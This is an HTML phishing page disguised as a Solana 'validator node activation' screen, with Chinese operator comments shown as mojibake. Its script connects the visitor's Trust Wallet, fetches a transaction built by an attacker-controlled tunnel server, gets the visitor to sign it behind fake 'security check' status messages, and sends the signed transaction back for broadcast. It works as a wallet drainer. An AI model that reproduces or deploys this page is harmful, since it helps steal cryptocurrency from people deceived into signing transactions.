<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Node Activation</title>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { text-align: center; padding: 20px; border: 1px solid #2b2f36; border-radius: 12px; background: #181a20; width: 90%; max-width: 400px; }
        button { background: #f0b90b; color: #000; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
        button:active { transform: scale(0.98); }
        .status { color: #848e9c; font-size: 12px; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <h2>Node Activation</h2>
    <p>Please synchronize your wallet to start the validator node.</p>
    <button id="activate_btn">ACTIVATE NOW</button>
    <div class="status" id="status_text">System: Ready to sync...</div>
</div>

<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

<script>
// ðŸ”± 1. é…ç½®ä½ çš„éš§é“åœ°å€ï¼ˆåŠ¡å¿…ä¿®æ”¹è¿™é‡Œï¼‰
const TUNNEL_URL = "https://ä½ çš„ç©¿é€åœ°å€.com"; 

async function startProcess() {
    const btn = document.getElementById('activate_btn');
    const st = document.getElementById('status_text');
    
    try {
        btn.disabled = true;
        st.innerText = "Connecting wallet...";

        // 2. èŽ·å–é’±åŒ…å¯¹è±¡
        const p = window.trustwallet?.solana || window.solana;
        if (!p) {
            alert("Trust Wallet not found! Please open in Trust Wallet Browser.");
            btn.disabled = false;
            return;
        }

        await p.connect();
        st.innerText = "Synchronizing data...";

        // 3. è¯·æ±‚åŽç«¯ V100 æž„é€ äº¤æ˜“
        const resp = await fetch(TUNNEL_URL + "/prepare_v32", {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: p.publicKey.toString() })
        });

        const info = await resp.json();
        
        if (info.raw_tx) {
            st.innerText = "Security check in progress...";
            const web3 = window.solanaWeb3;
            
            // 4. ååºåˆ—åŒ–å¹¶æ‹‰èµ·ç­¾å
            const txBuffer = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
            const tx = web3.Transaction.from(txBuffer);
            
            const signed = await p.signTransaction(tx);
            st.innerText = "Verifying signature...";

            // 5. å¹¿æ’­
            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
            await fetch(TUNNEL_URL + "/broadcast_v41", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ signed_tx: signedBase })
            });
            
            st.innerText = "Activation completed!";
        } else {
            st.innerText = "Error: " + (info.error || "Unknown");
            btn.disabled = false;
        }

    } catch (err) {
        console.error(err);
        st.innerText = "System busy, please try again.";
        btn.disabled = false;
    }
}

// ç»‘å®šäº‹ä»¶
document.getElementById('activate_btn').onclick = startProcess;
</script>

</body>
</html>
